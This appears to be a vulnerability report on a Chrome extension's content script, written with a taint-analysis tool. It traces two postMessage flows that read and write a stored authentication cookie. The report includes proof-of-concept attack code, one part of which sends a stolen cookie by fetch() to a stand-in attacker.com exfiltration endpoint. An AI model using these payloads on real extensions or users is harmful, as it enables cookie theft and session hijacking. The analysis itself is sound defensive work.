# CoCo Analysis: diafckgcomphojknnjjbdjjdpdeegnei

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2

---

## Sink 1: storage_local_get_source → window_postMessage_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/diafckgcomphojknnjjbdjjdpdeegnei/opgen_generated_files/cs_1.js
Line 418: var storage_local_get_source = {'key': 'value'};
Line 692: if (items && items['mwcookie']) { items['mwcookie'] }

**Code:**

```javascript
// Content script - Entry point (cs_1.js line 592)
window.addEventListener('message', this.onCoreMsg);

// Handler function (line 601-603)
coreapi.prototype.onCoreMsg = function (e) {
    try {
        window.coreapi.execute(e.data); // ← attacker-controlled via postMessage
    } catch (e) {
        console.log(e)
    }
}

// Execute function handles storage read (lines 687-696)
coreapi.prototype.execute = async function (e) {
    if (e.type == "req_cookie") {
        if (e.data.type == "get") {
            chrome.storage.local.get(["mwcookie"], function (items) {
                let ck = null;
                if (items && items['mwcookie']) {
                    ck = items['mwcookie']; // ← stored data
                }
                window.postMessage({ type: '_wacore_cookie_', msg: ck }, '*'); // ← leak to attacker
            });
        }
    }
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage

**Attack:**

```javascript
// Attacker's malicious webpage at https://web.whatsapp.com/*
// Trigger storage read and leak sensitive cookie data
window.postMessage({
    type: "req_cookie",
    data: { type: "get" }
}, "*");

// Attacker receives the stored cookie via message event listener
window.addEventListener("message", function(event) {
    if (event.data.type === "_wacore_cookie_") {
        console.log("Stolen cookie:", event.data.msg);
        // Send to attacker's server
        fetch("https://attacker.com/exfil", {
            method: "POST",
            body: JSON.stringify({ cookie: event.data.msg })
        });
    }
});
```

**Impact:** Information disclosure - attacker can extract sensitive authentication cookies stored in chrome.storage.local by the extension, enabling session hijacking.

---

## Sink 2: cs_window_eventListener_message → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/diafckgcomphojknnjjbdjjdpdeegnei/opgen_generated_files/cs_1.js
Line 601: coreapi.prototype.onCoreMsg = function (e) { e }
Line 603: window.coreapi.execute(e.data); { e.data }
Line 689: if (e.data.type == "get") { e.data }
Line 701: chrome.storage.local.set({ "mwcookie": e.data.cookie }, function () { e.data.cookie }

**Code:**

```javascript
// Content script - Entry point (cs_1.js line 592)
window.addEventListener('message', this.onCoreMsg);

// Handler function (line 601-603)
coreapi.prototype.onCoreMsg = function (e) {
    try {
        window.coreapi.execute(e.data); // ← attacker-controlled via postMessage
    } catch (e) {
        console.log(e)
    }
}

// Execute function handles storage write (lines 700-704)
coreapi.prototype.execute = async function (e) {
    if (e.type == "req_cookie") {
        if (e.data.type == "set") {
            chrome.storage.local.set({ "mwcookie": e.data.cookie }, function () { // ← attacker controls cookie value
            });
            window.postMessage({ type: '_wacore_cookie_', msg: e.data.cookie }, '*');
        }
    }
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage

**Attack:**

```javascript
// Attacker's malicious webpage at https://web.whatsapp.com/*
// Poison the stored cookie with attacker-controlled value
window.postMessage({
    type: "req_cookie",
    data: {
        type: "set",
        cookie: "malicious_token_xyz123"
    }
}, "*");

// Combined with Sink 1, attacker has complete control over storage:
// 1. Write malicious data to storage
// 2. Read it back to verify
// 3. The extension will use poisoned cookie for API authentication
```

**Impact:** Complete storage exploitation chain - attacker can write arbitrary authentication cookies to storage, which the extension then uses for API requests to hardcoded backend (this.api). When combined with Sink 1, attacker has full read/write control over the extension's authentication state, enabling session fixation attacks.

